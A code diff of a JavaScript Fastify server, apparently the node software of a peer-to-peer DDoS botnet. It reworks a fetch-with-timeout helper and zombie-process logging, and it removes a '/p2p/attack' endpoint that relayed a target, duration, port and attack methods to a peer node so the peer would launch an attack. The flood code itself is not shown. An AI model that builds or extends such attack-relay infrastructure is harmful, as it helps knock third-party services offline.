@@ -1,21 +1,3 @@
-// Helper function untuk fetch dengan timeout
-async function fetchWithTimeout(url, options = {}, timeout = 5000) {
-  const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), timeout);
-  
-  try {
-    const response = await fetch(url, {
-      ...options,
-      signal: controller.signal
-    });
-    clearTimeout(timeoutId);
-    return response;
-  } catch (error) {
-    clearTimeout(timeoutId);
-    throw error;
-  }
-}
-
 import Fastify from 'fastify';
 import fs from 'fs';
 import path from 'path';
@@ -27,6 +9,27 @@ import createReverseClient from './modules/reverseClient.js';
 import createProxyUpdater from './modules/proxyUpdater.js';
 import ExecutorClass from './modules/executor.js';
 import P2PHybridNode from './modules/p2pHybrid.js';
+
+// Helper function untuk fetch dengan timeout
+async function fetchWithTimeout(url, options = {}, timeout = 5000) {
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+  try {
+    const response = await globalThis.fetch(url, {
+      ...options,
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+    return response;
+  } catch (error) {
+    clearTimeout(timeoutId);
+    if (error.name === 'AbortError') {
+      throw new Error(`Request timeout after ${timeout}ms`);
+    }
+    throw error;
+  }
+}
 
 let encryptionManager = null;
 let encryptionInitialized = false;
@@ -188,7 +191,7 @@ const executor = new ExecutorClass(config);
 sharedData.executor = executor;
 
 executor.on('zombie_detected', (data) => {
-  console.log(`[ZOMBIE] Detected ${data.count} zombie process(es)`);
+  console.log(`[ZOMBIE] Detected ${data.count} zombie process(es) — killed: ${data.killed}, failed: ${data.failed}`);
   data.processes.forEach(p => {
     console.log(`[ZOMBIE] Process ${p.processId} overtime: ${Math.round(p.overtime/1000)}s`);
   });
@@ -636,38 +639,6 @@ fastify.post('/p2p/connect', async (request, reply) => {
   }
   
   const result = await p2pNode.connectToPeer(nodeId, { ip, port });
-  
-  reply.send({
-    status: result.success ? 'ok' : 'error',
-    ...result
-  });
-});
-
-// P2P Request Attack from Peer
-fastify.post('/p2p/attack', async (request, reply) => {
-  if (!p2pNode) {
-    return reply.status(503).send({
-      status: 'error',
-      error: 'P2P is not initialized'
-    });
-  }
-  
-  const { nodeId, target, time, port, methods } = request.body;
-  
-  if (!nodeId || !target || !time || !methods) {
-    return reply.status(400).send({
-      status: 'error',
-      error: 'Missing required parameters'
-    });
-  }
-  
-  const result = await p2pNode.requestAttackFromPeer(
-    nodeId,
-    target,
-    time,
-    port || 80,
-    methods
-  );
   
   reply.send({
     status: result.success ? 'ok' : 'error',
